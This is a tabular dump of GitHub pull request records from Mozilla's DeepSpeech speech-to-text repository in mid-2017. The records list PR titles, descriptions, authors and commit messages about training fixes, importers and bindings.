3724,https://api.github.com/repos/mozilla/DeepSpeech/pulls/694,694,Fix #667; early stop and export warning,"@tilmankamp , @kdavis-mozilla , @reuben : Fix for early stopping trigger after 1st epoch. Turns out validation losses were collected for all the jobs from the single epoch as different epochs on when running on GPUs. Now they are accumulated epoch wise and then considered for decision based on previous 'earlystop_nsteps' epochs.",andi4191,14961916,2017-07-04T04:18:44Z,CONTRIBUTOR,True,10,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,70a721cc012ce6ecb33b1e4f55753d682653848d,Fix #667; early stop and export warning
3725,https://api.github.com/repos/mozilla/DeepSpeech/pulls/681,681,Fix issue #668. Hang worker in Start batch.,,pecastro,352625,2017-07-02T12:23:53Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,750d4e89a5c17021dea8b15bcd3c19f9e2e1a9dd,Fix issue #668. Hang worker in Start batch.
3726,https://api.github.com/repos/mozilla/DeepSpeech/pulls/680,680,Improve the Python audioToInputVector implementation,"This is about 30% faster than the old code (35% if we didn't have to copy the strided array for whitening), and cleaner too, IMO.",reuben,477142,2017-06-30T19:12:35Z,MEMBER,True,26,56,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d749578ef5df8cd286deeeea170cf62af4693f15,Improve the Python audioToInputVector implementation
3727,https://api.github.com/repos/mozilla/DeepSpeech/pulls/679,679,add option flag cont_ckpt, to choose whether to continue the previous training,jinserk,823222,2017-06-30T18:01:01Z,NONE,False,10,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cd71955a3b525e2d385ed4ebd740097053af5c0f,"add option flag cont_ckpt

 choose whether to continue the previous training"
3728,https://api.github.com/repos/mozilla/DeepSpeech/pulls/676,676,Change library link ordering for python binding,This fixes issue #578,lissyx,1645737,2017-06-30T06:50:47Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,331a7f291c788bca7fdcaa7a114f7e0c837f6b04,"Change library link ordering for python binding

This fixes issue #578"
3729,https://api.github.com/repos/mozilla/DeepSpeech/pulls/674,674,Fix #363; Compare Bidirectional Recurrence vs Unidirectional Recurrence,"@kdavis-mozilla, @reuben : Can you have a look at this?

Changes Made: Replaced the lstm_cell consisting of forward and backward cell with the lstm_cell_stack consisting of 2 forward cells. The dimensionality of single 4096 units from the LSTM cell had been changed to 2 layer of 2048 units.

Dataset used: TED
Trainin time: 20:13:00
No. of Train epochs: 10
GPU instances used: 4 

Results:

Unidirectional Recurrence Case:

------------------------------------------------------------------------
I Test of Epoch 10 - WER: 0.448848, loss: 77.5554098553, mean edit distance: 0.209433
I --------------------------------------------------------------------------------
I WER: 0.333333, loss: 1.252548, mean edit distance: 0.076923
I  - src: ""no im serious""
I  - res: ""now im serious""
I --------------------------------------------------------------------------------
I WER: 0.333333, loss: 1.650417, mean edit distance: 0.076923
I  - src: ""no im serious""
I  - res: ""now im serious""
I --------------------------------------------------------------------------------
I WER: 0.333333, loss: 1.906622, mean edit distance: 0.076923
I  - src: ""no im serious""
I  - res: ""now im serious""
I --------------------------------------------------------------------------------
I WER: 0.333333, loss: 3.964957, mean edit distance: 0.222222
I  - src: ""and i say""
I  - res: ""and i save""
I --------------------------------------------------------------------------------
I WER: 0.500000, loss: 2.543439, mean edit distance: 0.100000
I  - src: ""farms that""
I  - res: ""forms that""
I --------------------------------------------------------------------------------
I WER: 0.500000, loss: 3.561996, mean edit distance: 0.100000
I  - src: ""farms that""
I  - res: ""forms that""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 1.825124, mean edit distance: 0.333333
I  - src: ""and""
I  - res: ""nd""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 2.459296, mean edit distance: 0.500000
I  - src: ""so""
I  - res: ""o""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 2.511882, mean edit distance: 0.500000
I  - src: ""so""
I  - res: ""o""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 3.144284, mean edit distance: 1.000000
I  - src: ""so""
I  - res: """"
I --------------------------------------------------------------------------------
",andi4191,14961916,2017-06-29T21:52:12Z,CONTRIBUTOR,False,82,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c87fe58f1924ff6f59a5f23abe5ee8465b910ae,Fix #363; Compare Bidirectional Recurrence vs Unidirectional Recurrence
3730,https://api.github.com/repos/mozilla/DeepSpeech/pulls/672,672,Update README.md to not suggest TF serving is used,Please review this risky change thoroughly.,reuben,477142,2017-06-29T21:39:47Z,MEMBER,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,794032ef66f1db7080c1e4d2dd836d2c19a3122a,Update README.md to not suggest TF serving is used
3731,https://api.github.com/repos/mozilla/DeepSpeech/pulls/665,665,Avoid stripping during install,"strip triggers issues on OSX:
/Library/Developer/CommandLineTools/usr/bin/strip: symbols referenced by
indirect symbol table entries that can't be stripped in:
/usr/local/lib/libtensorflow.so

Let's disable strip on install, we can always hand-strip if it is really
useful.

Fixes #635",lissyx,1645737,2017-06-28T16:28:18Z,COLLABORATOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,938f8c775517be7794615e2b2bc8de9deec590de,"Avoid stripping during install

strip triggers issues on OSX:
/Library/Developer/CommandLineTools/usr/bin/strip: symbols referenced by
indirect symbol table entries that can't be stripped in:
/usr/local/lib/libtensorflow.so

Let's disable strip on install, we can always hand-strip if it is really
useful.

Fixes #635"
3732,https://api.github.com/repos/mozilla/DeepSpeech/pulls/664,664,fixing typos,,ghost,10137,2017-06-28T13:07:07Z,NONE,True,7,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b0746dc97bcb5dcf031627470b8ef18d74ec625,fixing typos
3733,https://api.github.com/repos/mozilla/DeepSpeech/pulls/663,663,fixing typos,,ghost,10137,2017-06-28T12:15:24Z,NONE,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b5a30641f281f92fd07b6a7c170094ae7096822,fixing typos
3734,https://api.github.com/repos/mozilla/DeepSpeech/pulls/659,659,Fix #658; Update the documentation for Early Stopping parameter,@tilmankamp : Updated the documentation. Please have a look,andi4191,14961916,2017-06-27T17:51:21Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5525ed8010aef2c2a262acf88177d4c8de07db34,Fix #658; Update the documentation for Early Stopping parameter
3735,https://api.github.com/repos/mozilla/DeepSpeech/pulls/657,657,Use libtensorflow_cc for C++ API,,lissyx,1645737,2017-06-27T17:13:54Z,COLLABORATOR,True,7,7,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66f9c4d481d3b953926849fe1929ea3920563759,Use libtensorflow_cc for C++ API
3736,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79e86dd27e07a9d754c77ad5e5834611b645ea45,added extra items to gitignore
3737,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b60ed8dcf73b67c317aca39aa9ed81226977eed4,fixed Ubuntu linking issue
3738,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39c18237f5f65f6da851b22f142ea74a1137e2f6,set tf to 1.1.0 for now
3739,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d158ac0f2ed7716fecbea0f71b6257fec9397d5,changed default graph path for reload
3740,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2483227796e39c5601476444171f842107af72c5,added restore_checkpoint_path=FLAGS.checkpoint_dir
3741,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,beed94bc44074f33d0f9f4a70ef9f38648f8c846,updated gitignore
3742,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dffcb8d096010c80f5b7772a5e262315fdeab43f,added export graph
3743,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,254b8e71beed87129b9b5c90d3db870dac3a5f32,trying different checkpoint dir
3744,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a0b7539e4bfa68551c95632d8443dbd3f6c5cb9,"removed settings, not working"
3745,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a818e9a36a42a15b7b22c67d080501269afcb0ec,"halved librivox batch sizes, oom"
3746,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,45ed5f384d1f0e4e2f66c24147941f32d1257574,added more gitignore
3747,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e0a1622fd032b7184126abfb42df398e109fd9f,updated readme
3748,https://api.github.com/repos/mozilla/DeepSpeech/pulls/655,655,getting latest test,getting the latest from mozilla and merging it with my own,peter3125,10509162,2017-06-26T20:55:57Z,NONE,False,641,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,305a44a2137787397573220a30bb8fdaa5622296,updated readme 2
3749,https://api.github.com/repos/mozilla/DeepSpeech/pulls/652,652,Fix #645; fix #646; fixing problematic samples in Fisher importer,,tilmankamp,5991088,2017-06-23T16:11:31Z,CONTRIBUTOR,True,9,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4bfe89133ca16beba9a826b6033f97bd0d95843d,Fix #645; fix #646; fixing problematic samples in Fisher importer
3750,https://api.github.com/repos/mozilla/DeepSpeech/pulls/651,651,Fix #647; resampling Fisher from 8 to 16 kHz,,tilmankamp,5991088,2017-06-22T10:51:30Z,CONTRIBUTOR,True,12,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5300c594a607acaaacaaaea903d9e6748f1bf226,Fix #647; resampling Fisher from 8 to 16 kHz
3751,https://api.github.com/repos/mozilla/DeepSpeech/pulls/650,650,Fix #649; zero based sample indexing plus some debug log,,tilmankamp,5991088,2017-06-22T10:44:14Z,CONTRIBUTOR,True,2,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83737e98d67e8c4ea64843141984766f30b55b6c,Fix #649; zero based sample indexing plus some debug log
3752,https://api.github.com/repos/mozilla/DeepSpeech/pulls/648,648,Fix #538; Early stopping,"@tilmankamp , @kdavis-mozilla : Request you to have a look at this?

I have added few additional FLAG parameters such as (mean_loss_thresh and std_loss_thresh) to take care of the slight fluctuations in the past n_steps (configurable too).

By default, the early_stop flag has been enabled and validation_step is disabled so it will just show a warning message as:
_W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423_

**Test Cases:**
DataSet: LDC93S1
**Variations:** Changed the epochs to 50 and 150 to see if the Early Stopping is being triggered.

**With 50 epochs:**
Early stopping isn't triggered as expected from the logs of losses over Validation dataset

**With 150 epochs:**
Early stopping triggered at epoch 62.

**With validation step as 0 and early_stop as True:**
W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423

Please review for any comments. Since the TED dataset has only 10 epochs configured. I feel taking decision on past 4 validation loss was appropriate.

 ",andi4191,14961916,2017-06-21T21:06:54Z,CONTRIBUTOR,True,41,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b52a965e86d112f2a82782714f21c1279f36f626,Fix #538; Early stopping
3753,https://api.github.com/repos/mozilla/DeepSpeech/pulls/648,648,Fix #538; Early stopping,"@tilmankamp , @kdavis-mozilla : Request you to have a look at this?

I have added few additional FLAG parameters such as (mean_loss_thresh and std_loss_thresh) to take care of the slight fluctuations in the past n_steps (configurable too).

By default, the early_stop flag has been enabled and validation_step is disabled so it will just show a warning message as:
_W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423_

**Test Cases:**
DataSet: LDC93S1
**Variations:** Changed the epochs to 50 and 150 to see if the Early Stopping is being triggered.

**With 50 epochs:**
Early stopping isn't triggered as expected from the logs of losses over Validation dataset

**With 150 epochs:**
Early stopping triggered at epoch 62.

**With validation step as 0 and early_stop as True:**
W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423

Please review for any comments. Since the TED dataset has only 10 epochs configured. I feel taking decision on past 4 validation loss was appropriate.

 ",andi4191,14961916,2017-06-21T21:06:54Z,CONTRIBUTOR,True,41,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d248a0e147dcdb752113f016ad9b79c86d85821a,Fix #538; Review comments incorporated (Early Stopping)
3754,https://api.github.com/repos/mozilla/DeepSpeech/pulls/648,648,Fix #538; Early stopping,"@tilmankamp , @kdavis-mozilla : Request you to have a look at this?

I have added few additional FLAG parameters such as (mean_loss_thresh and std_loss_thresh) to take care of the slight fluctuations in the past n_steps (configurable too).

By default, the early_stop flag has been enabled and validation_step is disabled so it will just show a warning message as:
_W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423_

**Test Cases:**
DataSet: LDC93S1
**Variations:** Changed the epochs to 50 and 150 to see if the Early Stopping is being triggered.

**With 50 epochs:**
Early stopping isn't triggered as expected from the logs of losses over Validation dataset

**With 150 epochs:**
Early stopping triggered at epoch 62.

**With validation step as 0 and early_stop as True:**
W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423

Please review for any comments. Since the TED dataset has only 10 epochs configured. I feel taking decision on past 4 validation loss was appropriate.

 ",andi4191,14961916,2017-06-21T21:06:54Z,CONTRIBUTOR,True,41,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2915b7cbca94aec3d200cb92a5385b7fe25faeec,Fix #538; Further comments incorporated
3755,https://api.github.com/repos/mozilla/DeepSpeech/pulls/648,648,Fix #538; Early stopping,"@tilmankamp , @kdavis-mozilla : Request you to have a look at this?

I have added few additional FLAG parameters such as (mean_loss_thresh and std_loss_thresh) to take care of the slight fluctuations in the past n_steps (configurable too).

By default, the early_stop flag has been enabled and validation_step is disabled so it will just show a warning message as:
_W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423_

**Test Cases:**
DataSet: LDC93S1
**Variations:** Changed the epochs to 50 and 150 to see if the Early Stopping is being triggered.

**With 50 epochs:**
Early stopping isn't triggered as expected from the logs of losses over Validation dataset

**With 150 epochs:**
Early stopping triggered at epoch 62.

**With validation step as 0 and early_stop as True:**
W Validation flag needs to be enabled for Early Stopping to work
I STARTING Optimization
I Training of Epoch 0 - loss: 363.021423

Please review for any comments. Since the TED dataset has only 10 epochs configured. I feel taking decision on past 4 validation loss was appropriate.

 ",andi4191,14961916,2017-06-21T21:06:54Z,CONTRIBUTOR,True,41,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ebea35bf5ff37abe1a4d29202ad88a34d3e5125e,Fix #538; RC Incorporated
3756,https://api.github.com/repos/mozilla/DeepSpeech/pulls/639,639,adding instructions on how to set git-lfs,adding instructions on how to set git-lfs,ghost,10137,2017-06-19T11:07:43Z,NONE,False,15,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b644cec1628617bd0aabcda1912aa431f885f366,"adding instructions on how to set git-lfs

adding instructions on how to set git-lfs"
3757,https://api.github.com/repos/mozilla/DeepSpeech/pulls/639,639,adding instructions on how to set git-lfs,adding instructions on how to set git-lfs,ghost,10137,2017-06-19T11:07:43Z,NONE,False,15,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4afc9d3dc877d965a0edee37adf06b3a5d80134,Update README.md
3758,https://api.github.com/repos/mozilla/DeepSpeech/pulls/639,639,adding instructions on how to set git-lfs,adding instructions on how to set git-lfs,ghost,10137,2017-06-19T11:07:43Z,NONE,False,15,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f877799bfda47075a7516c37554341f56ac9ddf2,Update README.md
3759,https://api.github.com/repos/mozilla/DeepSpeech/pulls/639,639,adding instructions on how to set git-lfs,adding instructions on how to set git-lfs,ghost,10137,2017-06-19T11:07:43Z,NONE,False,15,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04ec8b01c35f982354a60df5910557753ba01fb3,Update README.md
3760,https://api.github.com/repos/mozilla/DeepSpeech/pulls/637,637,Fix #537; Ability to specify number of checkpoints that are kept in c…,"…heckpoint dir

@tilmankamp, @kdavis-mozilla : Request you to have a look at this.",andi4191,14961916,2017-06-16T21:39:23Z,CONTRIBUTOR,True,6,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b7a6750ce71de02370e6a1783674e466a9de6ed,Fix #537; Ability to specify number of checkpoints that are kept in checkpoint dir
3761,https://api.github.com/repos/mozilla/DeepSpeech/pulls/636,636,Fix #319; Adjust initialization of the first and last network layers,"@kdavis-mozilla, @reuben @tilmankamp  : Hi Kelly, Request you to have a look at this and review for comments, if any.",andi4191,14961916,2017-06-15T21:00:07Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5909fdbde5a5bb7699950eb8346e06a23d9a085b,Fix #319; Adjust initialization of the first and last network layers
3762,https://api.github.com/repos/mozilla/DeepSpeech/pulls/636,636,Fix #319; Adjust initialization of the first and last network layers,"@kdavis-mozilla, @reuben @tilmankamp  : Hi Kelly, Request you to have a look at this and review for comments, if any.",andi4191,14961916,2017-06-15T21:00:07Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f2ad809fd9e0ea9ba4f831ccb45bcf6671c2e23,"Fix #319; (Comments incorporated) Adjust initialization of the first and last network layers

Fix#319; Committing missing file changes"
3763,https://api.github.com/repos/mozilla/DeepSpeech/pulls/628,628,Fix #627; Fixing Fisher importer,,tilmankamp,5991088,2017-06-08T12:31:14Z,CONTRIBUTOR,True,17,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f495c6ffb14adac098cb79a045ad295f4aaf5286,Fix #627; Fixing Fisher importer
3764,https://api.github.com/repos/mozilla/DeepSpeech/pulls/622,622,Fixed #620,,kdavis-mozilla,12054740,2017-06-06T08:33:42Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,167d0acd99349dfd44f2f6388a8a45d1bb0c54a9,Fixed #620
3765,https://api.github.com/repos/mozilla/DeepSpeech/pulls/616,616,Fix #590; Fix #551; Fix #615; Better process exit and exception handling,,tilmankamp,5991088,2017-06-02T11:40:13Z,CONTRIBUTOR,True,145,89,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2968f771bb65e6ec667dba3cb9f9d1e1d26692f0,Fix #590; Fix #551; Fix #615; Better process exit and exception handlin
3766,https://api.github.com/repos/mozilla/DeepSpeech/pulls/613,613,Add an importer for newsml formatted data,"This adds an importer for newsml formatted data, specifically so we can import the data we've received from NPR. Given the format we've received it in, it requires that the SoX command-line client was built with mp3 support.",Cwiiis,668518,2017-05-31T14:01:13Z,CONTRIBUTOR,False,156,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2531f6dabe734a109c18c2ea639197e9558e0de9,Handle None and consecutive spaces in validate_label
3767,https://api.github.com/repos/mozilla/DeepSpeech/pulls/613,613,Add an importer for newsml formatted data,"This adds an importer for newsml formatted data, specifically so we can import the data we've received from NPR. Given the format we've received it in, it requires that the SoX command-line client was built with mp3 support.",Cwiiis,668518,2017-05-31T14:01:13Z,CONTRIBUTOR,False,156,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69374d148b05b4589b2ca5d627bacd5883e8bd9b,"Add a newsml importer

This importer makes some assumptions about directory layout and file
structure that may only hold true for the data we've been provided with."
3768,https://api.github.com/repos/mozilla/DeepSpeech/pulls/612,612,Fix #588; Unbuffered cluster logging with time prefixes,,tilmankamp,5991088,2017-05-29T14:22:48Z,CONTRIBUTOR,True,19,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d180ac787066e38c0b0e410983f4ea566fecc643,Fix #588; Unbuffered cluster logging with time prefixes
3769,https://api.github.com/repos/mozilla/DeepSpeech/pulls/609,609,Fixed issue #608,"Fixed by putting the `grad = tf.concat(grads, 0)` on host not device",kdavis-mozilla,12054740,2017-05-28T05:36:23Z,CONTRIBUTOR,True,25,23,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9002e0020fb1ab64ca63a6f12ceda509c0133b6,Fixed issue #608
3770,https://api.github.com/repos/mozilla/DeepSpeech/pulls/604,604,Add Node.js bindings. Fixes issue #603,,Cwiiis,668518,2017-05-25T19:08:39Z,CONTRIBUTOR,True,138,0,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac4e2b8364eec8f259007c2b6db1dda35ddf6511,Add Node.js bindings
3771,https://api.github.com/repos/mozilla/DeepSpeech/pulls/598,598,Fix #597; Adding support for user scripts,,tilmankamp,5991088,2017-05-24T15:31:35Z,CONTRIBUTOR,True,6,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89e7255b2de89f3d35c088ec4d066e09049fd3e1,Fix #597; Adding support for user scripts
3772,https://api.github.com/repos/mozilla/DeepSpeech/pulls/596,596,Fix #595; recalibrated batch size for new cluster and GPU setup,,tilmankamp,5991088,2017-05-24T14:57:51Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bee4b1de419abfd90f2bbcb9fd08f1d8b46dcd3a,Fix #595; recalibrated batch size for new cluster and GPU setup
3773,https://api.github.com/repos/mozilla/DeepSpeech/pulls/594,594,Fix #593; Fix for some debug log glitches,,tilmankamp,5991088,2017-05-24T14:48:37Z,CONTRIBUTOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,20d7808ede1f4184b6797cafd622d59f7761bfd1,Fix #593; Fix for some debug log glitches
3774,https://api.github.com/repos/mozilla/DeepSpeech/pulls/587,587,Fix #586; better coordinator connectivity management,,tilmankamp,5991088,2017-05-19T09:38:10Z,CONTRIBUTOR,True,36,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,138e20660b4e091c0a8a41535301990a804f714e,Fix #586; better coordinator connectivity management
3775,https://api.github.com/repos/mozilla/DeepSpeech/pulls/584,584,Fix #583; timeout parameter for coordinator connections; minor fixes,,tilmankamp,5991088,2017-05-18T13:06:03Z,CONTRIBUTOR,True,5,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56f68a30f73256810bbda646be02494b8a5fff43,Fix #583; timeout parameter for coordinator connections; minor fixes
3776,https://api.github.com/repos/mozilla/DeepSpeech/pulls/582,582,Fix of #577,,kdavis-mozilla,12054740,2017-05-18T09:45:33Z,CONTRIBUTOR,True,10,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be686c74f1b97104fb21bad03a386210f308d8f2,Fix of #577
3777,https://api.github.com/repos/mozilla/DeepSpeech/pulls/582,582,Fix of #577,,kdavis-mozilla,12054740,2017-05-18T09:45:33Z,CONTRIBUTOR,True,10,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2328988212af8bfedb8500121091e551f3c763fc,Added TF 1.0 and 1.1 support
3778,https://api.github.com/repos/mozilla/DeepSpeech/pulls/576,576,Fix #493; DeepSpeech part of SLURM cluster support,,tilmankamp,5991088,2017-05-16T15:24:39Z,CONTRIBUTOR,True,297,65,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e35fd8d464df6cba4fc28340277cea0792b015a5,Fix #493; DeepSpeech part of SLURM cluster support
